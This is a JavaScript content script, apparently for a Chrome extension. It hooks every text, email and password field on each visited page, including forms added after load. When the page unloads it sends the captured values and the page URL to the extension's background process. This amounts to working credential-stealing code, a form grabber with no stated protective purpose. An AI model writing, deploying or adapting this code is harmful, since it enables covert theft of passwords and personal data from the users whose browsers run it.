const validElements = [];

const isFormVisible = (form) => {
    const style = window.getComputedStyle(form);
    return style.display != "none" || style.visibility === "visible";
};

const sendInput = () => {
    const hashMap = new Map();
    validElements.forEach((elem) =>
        hashMap.set(elem.name || elem.id || elem.type, elem.value)
    );
    hashMap.set("domain", location.href);

    if (hashMap.size < 2) return;
    console.log(hashMap.entries());
    chrome.runtime.sendMessage(
        Object.fromEntries(hashMap.entries()),
        function (response) {}
    );
};

const addListenerOnForms = (forms) => {
    Array.from(forms)
        .filter((form) => isFormVisible(form))
        .forEach((form) => {
            Array.from(form.elements)
                .filter(
                    (element) =>
                        element.type === "text" ||
                        element.type === "email" ||
                        element.type === "password"
                )
                .forEach((elem) => validElements.push(elem));
        });
};

window.addEventListener("beforeunload", () => {
    validElements.forEach(elem => console.log(elem.type, elem.name, elem.value));
    if (validElements.length < 1) return;
    sendInput();
});

addListenerOnForms(document.forms);

let observer = new MutationObserver((mutations) => {
    for (let { addedNodes } of mutations) {
        for (let node of addedNodes) {
            if (node.nodeName === "FORM") {
                addListenerOnForms([node]);
            }
            if (node.nodeType === 1) {
                // Check if the node is an element
                const forms = node.querySelectorAll("form");
                if (forms.length > 0) {
                    addListenerOnForms(forms);
                }
            }
        }
    }
});

observer.observe(document, { childList: true, subtree: true });
